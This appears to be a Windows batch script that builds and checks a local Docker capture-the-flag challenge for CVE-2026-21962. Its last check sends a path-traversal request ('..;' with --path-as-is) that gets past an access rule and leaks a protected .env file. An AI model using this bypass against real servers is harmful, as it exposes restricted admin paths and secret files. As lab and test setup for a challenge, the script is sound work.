@echo off
setlocal
cd /d C:\SecuritySpace\cve-2026-21962-challenge\cve-2026-21962

echo ==========================================================
echo [0/4] check base image (cve-2026-21962-ohs-front)
echo ==========================================================
docker image inspect cve-2026-21962-ohs-front >nul 2>&1
if errorlevel 1 (
  echo [X] base image not found. load it first:
  echo     docker load -i C:\SecuritySpace\cve-2026-21962-images.tar
  goto end
)
echo OK - base image present

echo ==========================================================
echo [1/4] build single image  (yum/python3 - may take a minute)
echo ==========================================================
docker build -f single\Dockerfile -t cve-2026-21962-single .
if errorlevel 1 goto fail

echo ==========================================================
echo [2/4] run ONE container  (host port 10009 -^> 7777)
echo ==========================================================
docker rm -f chal_single >nul 2>&1
docker run -d --name chal_single -p 10009:7777 -e FLAG=WINS{single_test} cve-2026-21962-single
if errorlevel 1 goto fail
echo waiting 8s for startup...
timeout /t 8 >nul

echo ==========================================================
echo [3/4] verify: direct access must be BLOCKED (expect 404)
echo ==========================================================
curl -s -o nul -w "direct  -> HTTP %%{http_code}\n" "http://localhost:10009/internal-admin/cont/.env"

echo ==========================================================
echo [4/4] verify: bypass must LEAK the flag (expect 200 + WINS{...})
echo ==========================================================
curl -s --path-as-is "http://localhost:10009/foo/..;/internal-admin/cont/.env"
echo.
echo ----------------------------------------------------------
echo if you see  WINS{single_test}  above = SINGLE CONTAINER OK
echo ----------------------------------------------------------
goto end

:fail
echo.
echo [X] a step failed above - copy this whole window and send to Claude

:end
echo.
echo (cleanup later:  docker rm -f chal_single )
pause
